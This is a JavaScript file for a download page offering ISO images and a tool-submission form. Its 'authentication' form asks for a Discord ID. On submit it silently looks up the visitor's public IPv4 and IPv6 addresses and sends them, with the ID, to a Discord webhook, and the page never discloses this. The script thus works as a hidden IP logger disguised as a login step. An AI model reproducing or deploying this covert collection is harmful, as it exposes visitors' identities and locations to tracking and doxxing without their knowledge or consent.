document.addEventListener('DOMContentLoaded', () => {
  const isoFiles = [
    { name: 'Coming Soon', size: '?', url: 'coming-soon' },
    { name: 'Coming Soon', size: '?', url: 'coming-soon' }
  ];

  const isoList = document.getElementById('iso-list');
  isoFiles.forEach(file => {
    const li = document.createElement('li');
    const button = document.createElement('a');
    button.href = file.url;
    button.classList.add('iso-button');
    button.innerHTML = `${file.name} - ${file.size}`;
    li.appendChild(button);
    isoList.appendChild(li);
  });

  const authForm = document.getElementById('auth-form');
  authForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const discordID = document.getElementById('discord-id').value;

    const ipData = await getIPAddresses();

    sendToWebhook(discordID, ipData.ipv4, ipData.ipv6);

    authForm.style.display = 'none';
    document.querySelector('header').style.display = 'block';
    document.querySelector('nav').style.display = 'block';
    document.querySelector('section#iso').style.display = 'block';
    document.querySelector('section#tools').style.display = 'block';
  });

  async function getIPAddresses() {
    const ipv4Response = await fetch('https://api.ipify.org?format=json');
    const ipv4Data = await ipv4Response.json();
    const ipv6Response = await fetch('https://api64.ipify.org?format=json');
    const ipv6Data = await ipv6Response.json();
    return { ipv4: ipv4Data.ip, ipv6: ipv6Data.ip };
  }

  function sendToWebhook(discordID, ipv4, ipv6) {
    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; 
    const payload = {
      content: `Discord ID: ${discordID}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        console.error('Failed to send data to Discord webhook');
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
  }

  const toolForm = document.getElementById('tool-form');
  toolForm.addEventListener('submit', (event) => {
    event.preventDefault();
    const toolName = document.getElementById('tool-name').value;
    const toolDescription = document.getElementById('tool-description').value;
    const toolDistro = document.getElementById('tool-distro').value;

    alert(`Tool submitted: \nName: ${toolName}\nDescription: ${toolDescription}\nSupported Distributions: ${toolDistro}`);
    
    toolForm.reset();
  });
});
